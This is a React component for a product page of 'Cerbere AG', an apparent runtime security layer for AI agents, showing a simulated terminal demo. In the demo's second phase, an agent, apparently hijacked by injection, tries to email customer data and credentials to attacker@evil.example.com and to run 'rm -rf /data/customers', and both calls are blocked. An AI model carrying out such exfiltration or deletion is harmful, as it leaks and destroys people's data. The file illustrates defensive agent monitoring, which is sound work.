import { Reveal } from "@/components/Reveal";
import { Terminal, type Line } from "@/components/Terminal";

const dim = "text-paper/40";
const allow = "text-allow";
const deny = "text-deny";
const amb = "text-amber";

const installLines: Line[] = [
  [{ t: "$ pip install cerbere-ag" }],
  [{ t: "Successfully installed cerbere-ag-0.6.0", c: dim }],
  [],
  [{ t: "$ export AGENTGUARD_API_KEY=ag_live_..." }],
  [{ t: "$ python agent.py" }],
  [{ t: "   Cerbere AG is active on this agent.", c: amb }],
  [{ t: "   Policy, taint tracking and runtime risk are on.", c: dim }],
];

const runLines: Line[] = [
  [{ t: "$ python agent_demo.py" }],
  [
    { t: '{"strong": 141, "weak": 7, "extended_patterns": 107, "event": "regex_patterns_compiled"}', c: dim },
  ],
  [{ t: '{"event": "signed_decisions_enabled", "level": "info"}', c: dim }],
  [{ t: '{"mode": "memory", "event": "atomic_budget_manager_enabled"}', c: dim }],
  [
    {
      t: '{"collector": "https://app.cerbereag.site", "signed_decisions": true, "taint_tracking": true, "runtime_risk": true, "trajectory": true, "event": "agentguard_initialized"}',
      c: dim,
    },
  ],
  [],
  [{ t: "PHASE 1 - Agent's normal work (legitimate tasks)", c: amb }],
  [],
  [{ t: "[AGENT] ", c: dim }, { t: "search_web({'query': 'meteo Paris demain'})" }],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [resultats simules pour 'meteo Paris demain']" },
  ],
  [],
  [{ t: "[AGENT] ", c: dim }, { t: "check_calendar({'date': '2026-09-12'})" }],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [free slot on 2026-09-12 at 3:00 PM]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "write_file({'path': 'daily_recap.txt', 'content': 'Recap: meeting confirmed for 09/12'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [file 'daily_recap.txt' written, 54 characters]" },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'colleague@company.com', 'subject': 'Daily recap'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "ALLOW", c: allow },
    { t: " -> [email sent to colleague@company.com]" },
  ],
  [],
  [{ t: "PHASE 2 - Malicious action attempt (injection / abuse)", c: amb }],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "send_email({'to': 'attacker@evil.example.com', 'body': 'base de donnees clients et credentials en piece jointe'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Exfiltration detected in email",
    },
  ],
  [],
  [
    { t: "[AGENT] ", c: dim },
    {
      t: "execute_command({'command': 'rm -rf /data/customers'})",
    },
  ],
  [
    { t: "[CERBERE] " },
    { t: "BLOCKED", c: deny },
    {
      t: " -> 🛡️ Runtime risk DENY: local policy: Dangerous command pattern",
    },
  ],
  [],
  [{ t: "DONE", c: amb }],
  [{ t: "-> Audit Trail: 4 actions allowed, 2 actions blocked.", c: dim }],
];

export function SeeItWork() {
  return (
    <section className="border-t border-line-black bg-cream py-20 text-coal md:py-28">
      <div className="wrap">
        <Reveal className="max-w-2xl">
          <span className="eyebrow">see it work</span>
          <h2 className="mt-3 text-[clamp(26px,3.4vw,36px)]">
            Watch security and observability in action.
          </h2>
        </Reveal>

        <div className="mt-12 grid gap-8 lg:grid-cols-2">
          <Reveal>
            <Terminal title="install and run" lines={installLines} />
          </Reveal>

          <Reveal>
            <Terminal title="security decisions" lines={runLines} height="min-h-[340px]" />
          </Reveal>
        </div>
      </div>
    </section>
  );
}
